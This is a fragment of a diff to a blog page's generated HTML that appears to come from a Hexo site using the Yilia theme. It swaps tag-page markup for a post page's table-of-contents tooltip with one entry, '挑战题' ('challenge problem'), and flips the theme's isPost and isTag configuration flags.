-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#挑战题"><span class="toc-number">1.</span> <span class="toc-text">挑战题</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
   
-    </div></section>
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -274,9 +526,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
